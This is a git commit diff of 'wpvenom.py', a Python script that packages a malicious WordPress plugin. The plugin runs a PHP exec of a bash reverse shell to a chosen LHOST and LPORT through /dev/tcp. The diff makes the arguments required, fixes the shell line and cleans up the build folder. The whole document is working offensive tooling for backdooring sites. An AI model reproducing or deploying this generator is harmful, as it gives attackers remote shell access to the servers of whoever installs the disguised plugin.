cabee7839a48b230ab676d0b16dfeff2648bf7cf
panpas14 <panpas161@gmail.com>
2021-03-08 03:49:17 -0500

    modified:   wpvenom.py

--- wpvenom.py
+++ wpvenom.py
@@ -3,10 +3,10 @@ import os
 import shutil
 
 parser = argparse.ArgumentParser()
-parser.add_argument('-n',help="Name of the wordpress plugin")
-parser.add_argument('-H',help="LHOST")
-parser.add_argument('-P',help="LPORT")
-parser.add_argument('-p',nargs='?',help="path of a payload to embed")
+parser.add_argument('-n',help="Name of the wordpress plugin",required=True)
+parser.add_argument('-H',help="LHOST",required=True)
+parser.add_argument('-P',help="LPORT",required=True)
+parser.add_argument('-p',help="Path of a payload to embed")
 args = parser.parse_args()
 
 
@@ -15,7 +15,7 @@ LPORT = args.P
 PL_NAME = args.n
 
 def getPHPShellCode():
-	shell = """exec("/bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'")"""%(LHOST,LPORT)
+	shell = """exec("/bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'");"""%(LHOST,LPORT)
 	return shell
 
 def createHeader():
@@ -32,7 +32,7 @@ def createHeader():
 	return header
 	
 def createPlugin():
-try:
+	try:
 		os.mkdir(PL_NAME)
 		headercode = createHeader()
 		headerfile = open(PL_NAME + "/" + PL_NAME + ".php","w")
@@ -45,6 +45,7 @@ try:
 		shellfile.close()
 		#zip files here
 		shutil.make_archive(PL_NAME,'zip',PL_NAME)
+		shutil.rmtree(PL_NAME)
 	except FileExistsError:
 		print(f"There's already a directory with the name \"{PL_NAME}\"")
 
